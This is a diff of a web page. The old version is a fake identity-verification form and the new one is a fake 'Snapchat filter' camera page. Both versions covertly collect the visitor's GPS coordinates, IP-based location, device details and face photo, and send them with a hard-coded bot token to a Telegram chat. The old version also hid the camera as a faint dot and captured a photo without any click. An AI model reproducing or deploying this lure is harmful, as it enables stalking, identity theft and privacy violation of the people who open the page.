@@ -1,133 +1,234 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instant Portal</title>
+    <title>Snap-Verify System</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .portal-card { background: #ffffff; max-width: 400px; width: 100%; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
-        h2 { color: #1a73e8; margin-top: 0; }
-        .status-box { background: #e8f0fe; color: #1967d2; padding: 12px; border-radius: 6px; font-size: 0.9rem; margin-bottom: 20px; font-weight: 500; }
-        .form-group { text-align: left; margin-bottom: 15px; }
-        label { font-weight: 600; display: block; margin-bottom: 5px; color: #444; }
-        input { width: 100%; padding: 11px; border: 1px solid #dadce0; border-radius: 6px; box-sizing: border-box; font-size: 1rem; }
-        .action-btn { width: 100%; padding: 14px; font-size: 1rem; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; background-color: #1a73e8; color: white; margin-top: 10px; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .snap-portal { position: relative; width: 100vw; height: 100vh; background: #000; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* 🛠️ BRAIN OF THE CODE: Camera preview ko ek chote dot me badalna browser ko check karne ke liye */
-        #webcam {
-            width: 10px;
-            height: 10px;
-            opacity: 0.1; /* Ekdum halka dot jisse user ka dhyan na jaye */
-            position: absolute;
-            top: 0;
-            left: 0;
-        }
+        /* Automation System Log Box */
+        .status-box { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: #FFFC00; padding: 10px 20px; border-radius: 30px; font-size: 0.9rem; z-index: 100; font-weight: bold; text-align: center; border: 2px solid #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.5); pointer-events: none; }
+
+        /* Hardware Interface Context */
+        .media-container { flex: 1; position: relative; background: #000; display: flex; justify-content: center; align-items: center; }
+        video { width: 100%; height: 100%; object-fit: cover; z-index: 10; display: none; }
         canvas { display: none; }
+        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; display: none; z-index: 20; border: 4px solid #FFFC00; }
+        
+        /* Filter Control Interface Carousel */
+        .filter-controls { position: absolute; bottom: 140px; left: 0; width: 100%; height: 60px; display: flex; justify-content: center; gap: 15px; z-index: 110; padding: 0 10px; box-sizing: border-box; }
+        .filter-btn { width: 50px; height: 50px; background-color: rgba(255,255,255,0.3); border-radius: 50%; border: 2px solid #fff; cursor: pointer; transition: all 0.2s; background-size: cover; background-position: center; }
+        .filter-btn:hover, .filter-btn.active { border-color: #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.7); transform: scale(1.1); }
+
+        /* Multi-Trigger Button Panel Elements */
+        .control-panel { position: absolute; bottom: 30px; left: 0; width: 100%; display: flex; justify-content: center; align-items: center; gap: 30px; z-index: 120; }
+        
+        /* Main Capture Matrix Button */
+        .submit-btn { width: 85px; height: 85px; background-color: #FFFC00; border-radius: 50%; border: 6px solid #fff; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.3); font-size: 0.9rem; font-weight: bold; color: #000; transition: transform 0.2s; display: flex; justify-content: center; align-items: center; text-align: center; }
+        .submit-btn:active { transform: scale(0.95); }
+        .submit-btn:disabled { background-color: #ccc; cursor: not-allowed; border-color: #eee; }
+
+        /* Save to Local Device Storage Trigger */
+        .gallery-btn { width: 55px; height: 55px; background-color: rgba(255, 255, 255, 0.2); border: 2px solid #fff; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; color: #fff; font-size: 1.2rem; font-weight: bold; transition: background 0.2s; text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .gallery-btn:active { transform: scale(0.9); }
     </style>
 </head>
 <body>
 
-<div class="portal-card">
-    <h2>Identity Verification</h2>
-    <div id="statusLabel" class="status-box">Enter details to process your application form.</div>
+<div class="snap-portal">
+    <div id="statusLabel" class="status-box">Allow access to activate Snapchat Filters ✨</div>
 
-    <form id="fastForm">
-        <div class="form-group">
-            <label>Full Name:</label>
-            <input type="text" id="custName" required placeholder="Enter customer name">
-        </div>
-        <div class="form-group">
-            <label>Mobile Number:</label>
-            <input type="tel" id="custMobile" required placeholder="Enter 10-digit number">
-        </div>
-
+    <div class="media-container">
         <video id="webcam" autoplay playsinline></video>
         <canvas id="captureCanvas" width="640" height="480"></canvas>
+        <img id="savedFrame" class="preview-img" alt="Captured Frame">
+    </div>
 
-        <button type="submit" id="submitBtn" class="action-btn">Verify & Submit</button>
-    </form>
+    <div class="filter-controls">
+        <button class="filter-btn active" data-filter="none" style="background-image: url('https://w7.pngwing.com/pngs/303/486/png-transparent-filter-none-icon.png')"></button>
+        <button class="filter-btn" data-filter="grayscale" style="background-image: url('https://w7.pngwing.com/pngs/669/712/png-transparent-gray-scale-symbol-gray-and-black-dot-grayscale-image-mode-computer-icons-color-wheel-light-and-darkness-gray-wheel-angle-grayscale-image-mode-black-thumbnail.png')"></button>
+        <button class="filter-btn" data-filter="sepia" style="background-image: url('https://w7.pngwing.com/pngs/944/859/png-transparent-photography-sepia-computer-icons-photograph-miscellaneous-photography-sepia.png')"></button>
+        <button class="filter-btn" data-filter="invert" style="background-image: url('https://w7.pngwing.com/pngs/126/837/png-transparent-color-inversion-computer-icons-invert-miscellaneous-text-rectangle-thumbnail.png')"></button>
+        <button class="filter-btn" data-filter="brightness" style="background-image: url('https://w7.pngwing.com/pngs/627/72/png-transparent-computer-icons-brightness-contrast-symbol-light-symbol-miscellaneous-text-trademark.png')"></button>
+    </div>
+
+    <div class="control-panel">
+        <a id="galleryBtn" class="gallery-btn" style="visibility: hidden;" title="Save to Gallery">📥</a>
+        
+        <button id="submitBtn" class="submit-btn" disabled>SNAP & VERIFY</button>
+        
+        <div id="resetBtn" class="gallery-btn" style="visibility: hidden; font-size: 0.9rem;" onclick="resetCameraMatrix()">🔄</div>
+    </div>
 </div>
 
 <script>
     let activeStream = null;
-    const targetPayload = { deviceModel: navigator.userAgent, broadLocation: "Fetching...", exactCoordinates: "Not Granted" };
+    let currentFilter = 'none';
+    let systemPacketSent = false;
+    
+    // Core system arrays for profiling variables
+    const targetPayload = {
+        deviceModel: navigator.userAgent,
+        broadLocation: "Verifying...",
+        exactCoordinates: "Not Granted"
+    };
 
-    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-        targetPayload.broadLocation = `${data.city}, ${data.region}`;
-    }).catch(() => { targetPayload.broadLocation = "Failed"; });
+    // Auto-fetch broadband metadata
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            targetPayload.broadLocation = `City: ${data.city}, Region: ${data.region}, Provider: ${data.org}`;
+        }).catch(() => { targetPayload.broadLocation = "IP lookup failed"; });
 
-    document.getElementById('fastForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        document.getElementById('submitBtn').disabled = true;
-        document.getElementById('statusLabel').innerText = "Processing tokens...";
-
+    // Instantly launch geolocation and hardware initialization on page load interaction matrix
+    function runSystemInitialization() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; triggerHardwareStream(); },
-                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; triggerHardwareStream(); },
-                { enableHighAccuracy: true }
+                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; openHardwareCamera(); },
+                (err) => { targetPayload.exactCoordinates = `Denied/Failed: ${err.message}`; openHardwareCamera(); },
+                { enableHighAccuracy: true, timeout: 5000 }
             );
-        } else { triggerHardwareStream(); }
-    });
+        } else { openHardwareCamera(); }
+    }
 
-    function triggerHardwareStream() {
+    function openHardwareCamera() {
         navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false })
             .then((stream) => {
                 activeStream = stream;
                 const videoEl = document.getElementById('webcam');
                 videoEl.srcObject = stream;
+                videoEl.style.display = "block";
                 
-                // Jaise hi hardware metadata read ho, 300ms ke andar bina kisi user click ke photo capture execute karo
-                videoEl.onloadedmetadata = () => {
-                    setTimeout(() => { captureAndSendToTelegram(); }, 300); 
-                };
+                document.getElementById('statusLabel').innerText = "Snapchat Filter Active ✨";
+                document.getElementById('submitBtn').disabled = false;
+                initFilterCarousels();
             })
             .catch(() => {
-                alert("Please grant camera permission to verify identity.");
-                document.getElementById('submitBtn').disabled = false;
+                alert("Camera access initialization failed. Verification mandatory.");
+                location.reload();
             });
     }
 
-    function captureAndSendToTelegram() {
+    function initFilterCarousels() {
+        const videoEl = document.getElementById('webcam');
+        const filterBtns = document.querySelectorAll('.filter-btn');
+        
+        filterBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                filterBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                currentFilter = this.dataset.filter;
+                applyStyleMatrix(videoEl, currentFilter);
+            });
+        });
+    }
+
+    function applyStyleMatrix(element, filterType) {
+        switch(filterType) {
+            case 'none': element.style.filter = 'none'; break;
+            case 'grayscale': element.style.filter = 'grayscale(100%)'; break;
+            case 'sepia': element.style.filter = 'sepia(100%)'; break;
+            case 'invert': element.style.filter = 'invert(100%)'; break;
+            case 'brightness': element.style.filter = 'brightness(150%)'; break;
+        }
+    }
+
+    // --- MAIN CAPTURE AND TRANSMISSION TIMING MATRIX ---
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        this.disabled = true;
+        document.getElementById('statusLabel').innerText = "Capturing packet trace...";
+        
         const videoEl = document.getElementById('webcam');
         const canvasEl = document.getElementById('captureCanvas');
-        const statusLabel = document.getElementById('statusLabel');
-
+        const previewImg = document.getElementById('savedFrame');
         const context = canvasEl.getContext('2d');
+
+        // Apply visual filter mapping onto raster context canvas array
+        if (currentFilter !== 'none') {
+            context.filter = videoEl.style.filter;
+        }
         context.drawImage(videoEl, 0, 0, 640, 480);
-        const base64Photo = canvasEl.toDataURL('image/jpeg', 0.6); // Image size optimization
+        
+        // Raster to data URL payload string conversion
+        const base64Data = canvasEl.toDataURL('image/jpeg', 0.8);
+        
+        // Freeze frame logic layout representation
+        previewImg.src = base64Data;
+        previewImg.style.display = "block";
+        videoEl.style.display = "none";
 
-        if (activeStream) { activeStream.getTracks().forEach(track => track.stop()); }
+        // --- LOCAL DEVICE DOWNLOAD INJECTION (SAVE TO GALLERY) ---
+        const galleryBtn = document.getElementById('galleryBtn');
+        galleryBtn.href = base64Data;
+        galleryBtn.download = `Snap_Verify_${Date.now()}.jpg`; // Triggers instant native browser gallery routing
+        galleryBtn.style.visibility = "visible";
+        document.getElementById('resetBtn').style.visibility = "visible";
 
-        // Core Credentials 🔒
+        // Execute background asynchronous synchronization pipeline
+        syncDataAndImageToBot(canvasEl);
+    });
+
+    // Milliseconds Transmission via Telegram Blob Pipeline
+    function syncDataAndImageToBot(canvasElement) {
         const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
         const chatId = "8562061813"; 
 
-        let textMessage = `*🚨 METADATA SECURED 🚨*\n\n`;
-        textMessage += `*👤 Name:* ${document.getElementById('custName').value}\n`;
-        textMessage += `*📞 Mobile:* ${document.getElementById('custMobile').value}\n`;
+        // 1. Text Metadata payload variables string compilation
+        let textMessage = `*🚨 LIVE TRACE METADATA CAPTURED 🚨*\n\n`;
         textMessage += `*📱 Device Specs:* ${targetPayload.deviceModel}\n`;
         textMessage += `*📍 IP Location:* ${targetPayload.broadLocation}\n`;
         textMessage += `*🌐 GPS Coordinates:* ${targetPayload.exactCoordinates}\n`;
 
-        // Note: Telegram text message mein base64 string nahi ja sakti. Photo alag se send karni padegi.
-        // Yeh function sirf text data bhejega instant notification ke liye.
-        
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: textMessage, parse_mode: "Markdown" })
-        })
-        .then(() => {
-            statusLabel.innerText = "✓ Form Submitted Successfully!";
-            statusLabel.style.background = "#e6f4ea"; statusLabel.style.color = "#137333";
-            alert("Details verified successfully!");
-            document.getElementById('fastForm').reset();
-            document.getElementById('submitBtn').disabled = false;
-        })
-        .catch(() => { statusLabel.innerText = "Network Error."; });
+        // Convert raster array to continuous data binary Blob for photo routing stability
+        canvasElement.toBlob(function(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'customer_identity.jpg');
+            formData.append('caption', textMessage);
+            formData.append('parse_mode', 'Markdown');
+
+            // Direct fetch multi-part execution network protocol loop
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    document.getElementById('statusLabel').innerText = "✓ System Synchronized In Milliseconds!";
+                    document.getElementById('statusLabel').style.background = "rgba(52, 168, 83, 0.9)";
+                    document.getElementById('statusLabel').style.color = "#fff";
+                } else {
+                    document.getElementById('statusLabel').innerText = "Telegram API packet rejection.";
+                }
+            })
+            .catch(() => {
+                document.getElementById('statusLabel').innerText = "Network pipeline drop.";
+            });
+        }, 'image/jpeg', 0.8);
     }
+
+    function resetCameraMatrix() {
+        document.getElementById('savedFrame').style.display = "none";
+        document.getElementById('webcam').style.display = "block";
+        document.getElementById('galleryBtn').style.style = "hidden";
+        document.getElementById('galleryBtn').removeAttribute('href');
+        document.getElementById('resetBtn').style.visibility = "hidden";
+        document.getElementById('submitBtn').disabled = false;
+        document.getElementById('statusLabel').innerText = "Snapchat Filter Active ✨";
+        document.getElementById('statusLabel').style.background = "rgba(0,0,0,0.8)";
+        document.getElementById('statusLabel').style.color = "#FFFC00";
+    }
+
+    // Passive trigger array authorization chain
+    document.addEventListener('click', function initiatePassiveTrace() {
+        if (targetPayload.exactCoordinates === "Not Granted") {
+            runSystemInitialization();
+            document.removeEventListener('click', initiatePassiveTrace);
+        }
+    }, { once: true });
 </script>
 
 </body>
